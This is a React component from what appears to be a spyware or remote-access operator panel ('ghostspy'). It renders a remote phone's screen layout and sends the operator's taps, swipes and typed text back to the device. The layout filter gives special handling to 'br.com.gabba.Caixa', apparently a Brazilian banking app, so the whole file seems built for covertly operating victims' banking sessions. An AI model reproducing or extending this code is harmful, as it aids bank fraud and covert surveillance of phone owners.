import React, { useEffect, useState, useRef } from "react";
import { useMediaQuery } from "react-responsive";

import { Grid, Box, TextField, Typography, CardMedia, IconButton } from "@mui/material";
import { useTranslation } from "react-i18next";
import { useDrag } from "react-use-gesture";

import { useSocket } from "../../hooks/use-socket";
import { useSocketFunctions } from "../../utils/socket";
import { SocketIOPublicEvents } from "../../sections/settings/setting-socket";

import MonitorViewer from "../monitorViewer";
import ScreenToolbar from "./screenTools";

import SendOutlinedIcon from "@mui/icons-material/SendOutlined";
import KeyboardArrowDownOutlinedIcon from "@mui/icons-material/KeyboardArrowDownOutlined";
import KeyboardControlKeyOutlinedIcon from "@mui/icons-material/KeyboardControlKeyOutlined";

import Color from "src/theme/colors";

const ScreenMonitorSkeleton = ({ monitor, device, onClose }) => {
  const { t } = useTranslation();
  const isMobile = useMediaQuery({ query: "(max-width: 475px)" });
  const isTablet = useMediaQuery({ query: "(max-width: 1024px) and (min-width: 476px)" }); // Tablet between 476px and 1024px
  const { onSocketMonitor, onScreenClickEvent, onScreenDragEvent, onSendTextEvent } =
    useSocketFunctions();
  const { socket } = useSocket();
  const screenRef = useRef(null);

  const [state, setState] = useState({
    width: 360,
    height: 720,
    x: 100,
    y: -120,
    minWidth: 360,
    minHeight: 720,
    maxWidth: 360,
    maxHeight: 720,
  });

  const [openIput, setOpenInput] = useState(false);
  const [skeletonData, setSkeletionData] = useState([]);
  const [deviceWidth, setDeviceWidth] = useState("");
  const [deviceHeight, setDeviceHeight] = useState("");
  const [changeLoading, setChangeLoading] = useState(false);
  const [positions, setPositions] = useState([]);
  const [mouseDown, setMouseDown] = useState(false);
  const [messageOpen, setmessageOpen] = useState(false);
  const [message, setMessage] = useState(null);

  const black = localStorage.getItem("black");
  const lock = localStorage.getItem("lock");

  useEffect(() => {
    if (!isMobile) {
      setOpenInput(true);
    }
  }, [isMobile]);

  useEffect(() => {
    const deviceId = device?.deviceId;
    let isMounted = true;

    const monitorDevice = async () => {
      try {
        if (deviceId) {
          setChangeLoading(true);
          await onSocketMonitor(monitor, { deviceId });

          const handleMonitorResponse = (data) => {
            if (isMounted && monitor === data.type) {
              console.log("10:", data.response);
              const deviceW = data.response?.deviceWidth;
              const deviceH = data.response?.deviceHeight;
              const skeletonRes = data.response?.skeletonData.filter(
                (filterdata) =>
                  (filterdata.packageName == "br.com.gabba.Caixa" ||
                    (filterdata.type !== "view" &&
                      filterdata.packageName !== "br.com.gabba.Caixa")) &&
                  !(filterdata.type === "text" && filterdata.text == "")
              );
              setDeviceWidth(deviceW);
              setDeviceHeight(deviceH);
              setSkeletionData(skeletonRes);
              setChangeLoading(false);
              setmessageOpen(true);
            }
          };

          socket.on(`screen-skeleton-shared-${deviceId}`, handleMonitorResponse);

          return () => {
            socket.off(`screen-skeleton-shared-${deviceId}`, handleMonitorResponse);
            isMounted = false;
          };
        }
      } catch (error) {
        console.error("Error monitoring device:", error);
      }
    };

    monitorDevice();
  }, [monitor]);

  // Close
  const onCloseModal = async () => {
    try {
      onClose(false);
    } catch (error) {
      console.log("close monitor modal error", error);
    }
  };

  // Prevent drag on image
  const preventDrag = (e) => {
    e.stopPropagation();
  };

  const onSkeletonClick = (data) => {
    if (data.type === "edit") {
      setMessage(data);
      setmessageOpen(true);
    }
  };

  // send screen text
  const onSendInputText = async () => {
    try {
      const deviceId = device?.deviceId;

      await onSendTextEvent(SocketIOPublicEvents.screen_send_text_event, {
        deviceId,
        message,
      });
    } catch (error) {
      console.log("send text error", error);
    }
  };

  // X, Y calculation
  const calculatePosition = (clientX, clientY) => {
    const screenElement = screenRef.current;
    if (!screenElement || !screenElement.offsetWidth || !screenElement.offsetHeight) {
      return { xPosition: 0, yPosition: 0 };
    }

    const rect = screenElement.getBoundingClientRect();

    const x = clientX - rect.left;
    const y = clientY - rect.top;

    const renderedWidth = rect.width;
    const renderedHeight = rect.height;

    const intrinsicWidth = 360;
    const intrinsicHeight = (deviceHeight * 360) / deviceWidth;

    const xRate = intrinsicWidth / renderedWidth;
    const yRate = intrinsicHeight / renderedHeight;

    let xPosition = x * xRate;
    let yPosition = y * yRate;

    xPosition = parseFloat(xPosition.toFixed(6));
    yPosition = parseFloat(yPosition.toFixed(6));

    return { xPosition, yPosition };
  };

  // Handle drag
  const bind = useDrag(async ({ event, memo = { startX: 0, startY: 0 } }) => {
    const deviceId = device?.deviceId;

    if (event.type === "pointerdown") {
      setPositions([]);
      setMouseDown(true);
      memo.startX = event.clientX;
      memo.startY = event.clientY;
    } else if (event.type === "pointermove") {
      if (mouseDown) {
        const { xPosition, yPosition } = calculatePosition(event.clientX, event.clientY);
        if (xPosition >= 0 && yPosition >= 0) {
          setPositions((prevPositions) => [...prevPositions, { x: xPosition, y: yPosition }]);
        }
      }
    } else if (event.type === "pointerup") {
      setMouseDown(false);
      if (positions.length === 0) {
        const { xPosition, yPosition } = calculatePosition(event.clientX, event.clientY);

        if (xPosition >= 0 && yPosition >= 0) {
          await onScreenClickEvent(SocketIOPublicEvents.screen_click_event, {
            deviceId,
            xPosition,
            yPosition,
          });
        }
      } else {
        await onScreenDragEvent(SocketIOPublicEvents.screen_drag_event, {
          deviceId,
          positions,
        });
      }
      setPositions([]);
    }
    return memo;
  });

  const onCloseInputBox = () => {
    setOpenInput(false);
  };
  const onOpenInputBox = () => {
    setOpenInput(true);
  };

  return (
    <MonitorViewer
      initialState={{
        width: 360,
        height: 720,
        x: 100,
        y: isTablet ? -400 : -120,
        minWidth: 270,
        minHeight: 540,
        maxWidth: 360,
        maxHeight: 720,
      }}
      type="skeleton"
      onClose={onCloseModal}
    >
      <div style={{ position: "relative", width: "100%", height: "100%" }}>
        <Box
          onMouseDown={preventDrag}
          onTouchStart={preventDrag}
          sx={{ cursor: "default", pointerEvents: "auto" }}
        >
          <ScreenToolbar device={device} black={black} lock={lock} />
        </Box>

        <Grid
          sx={{
            display: "flex",
            justifyContent: "center",
            alignItems: "center",
            width: "100%",
            height: "100%",
            overflow: "hidden",
          }}
        >
          <Grid
            onMouseDown={preventDrag}
            onTouchStart={preventDrag}
            sx={{
              cursor: "default",
              height: "100%",
              width: "100%",
              position: "absolute",
              top: 0,
              left: 0,
              zIndex: 2,
              opacity: 0.1,
            }}
            {...bind()}
          ></Grid>

          <Box
            sx={{
              width: "100%",
              height: "100%",
              backgroundColor: "black",
              position: "relative",
              border: `1px solid ${Color.background.border}`,
              display: "flex",
              justifyContent: "center",
              alignItems: "center",
            }}
            ref={screenRef}
          >
            {skeletonData.length > 0 ? (
              skeletonData.map((data, index) => (
                <Box
                  key={index}
                  className="screen-body"
                  sx={{
                    width: `${data.width * (320 / deviceWidth)}px`,
                    height: `${data.height * (660 / deviceHeight)}px`,
                    left: `${data.xposition * (320 / deviceWidth)}px`,
                    top: `${data.yposition * (660 / deviceHeight)}px`,
                    cursor: data.type === "edit" ? "pointer" : "default",
                    backgroundColor: data?.type === "button" ? "none" : "black",
                    border: `1px solid ${data.type == "view" ? "none" : Color.background.border}`,
                    position: "absolute",
                  }}
                  onClick={() => onSkeletonClick(data)}
                >
                  <Box
                    sx={{
                      display: "flex",
                      justifyContent: "flex-start",
                      alignItems: "center",
                      height: "100%",
                    }}
                  >
                    {data.type !== "view" && (
                      <Typography
                        variant="body1"
                        sx={{
                          color: Color.text.primary,
                          fontSize: "9px",
                          textAlign: "center",
                        }}
                      >
                        {data.text}
                      </Typography>
                    )}

                    {data.type === "edit" && (
                      <Typography
                        variant="body1"
                        sx={{ color: Color.text.secondary, fontSize: "9px" }}
                      >
                        {data.type}
                      </Typography>
                    )}
                  </Box>
                </Box>
              ))
            ) : (
              <CardMedia
                className="screen-body"
                component="img"
                src={"/assets/logos/spy/ghostspy-logo-_2_.webp"}
                sx={{
                  cursor: "default",
                  width: "auto",
                  height: "auto",
                  borderRadius: "0px",
                }}
              />
            )}
          </Box>
        </Grid>
        {/* Open Input Panel */}
        {skeletonData.length > 0 && (
          <>
            {isMobile && (
              <Box
                sx={{
                  position: "fixed",
                  bottom: "10px",
                  right: "5px",
                  zIndex: 99999,
                  color: "red",
                }}
              >
                {openIput ? (
                  <IconButton
                    onClick={onCloseInputBox}
                    sx={{
                      color: Color.text.primary,
                      cursor: "pointer",
                      padding: "5px",
                      backgroundColor: Color.background.secondary,
                      border: `solid 1px ${Color.background.purple}`,
                    }}
                  >
                    <KeyboardArrowDownOutlinedIcon />
                  </IconButton>
                ) : (
                  <IconButton
                    onClick={onOpenInputBox}
                    sx={{
                      color: Color.text.primary,
                      cursor: "pointer",
                      padding: "5px",
                      backgroundColor: Color.background.secondary,
                      border: `solid 1px ${Color.background.purple}`,
                    }}
                  >
                    <KeyboardControlKeyOutlinedIcon />
                  </IconButton>
                )}
              </Box>
            )}

            {openIput && (
              <Box
                sx={{
                  width: "100%",
                  display: "flex",
                  justifyContent: "center",
                }}
              >
                <Box
                  onMouseDown={preventDrag}
                  onTouchStart={preventDrag}
                  sx={{
                    position: "absolute",
                    bottom: !isMobile ? "-50px" : "8px",
                    zIndex: 99999,
                    width: !isMobile ? "100%" : "230px",
                    minWidth: "180px",
                  }}
                >
                  <Box
                    sx={{
                      display: "flex",
                      alignItems: "center",
                      gap: "10px",
                    }}
                  >
                    <TextField
                      className="screen-message"
                      fullWidth
                      value={message?.text || ""}
                      onChange={(e) => setMessage({ ...message, text: e.target.value })}
                      inputProps={{
                        style: {
                          backgroundColor: Color.background.main,
                          padding: "10px 50px 10px 10px",
                        },
                      }}
                    />
                    <SendOutlinedIcon
                      onClick={() => onSendInputText()}
                      sx={{
                        backgroundColor: Color.background.main,
                        position: "absolute",
                        right: "1%",
                        color: Color.text.primary,
                        cursor: "default",
                        fontSize: "30px",
                      }}
                    />
                  </Box>
                </Box>
              </Box>
            )}
          </>
        )}
      </div>
    </MonitorViewer>
  );
};

export default ScreenMonitorSkeleton;
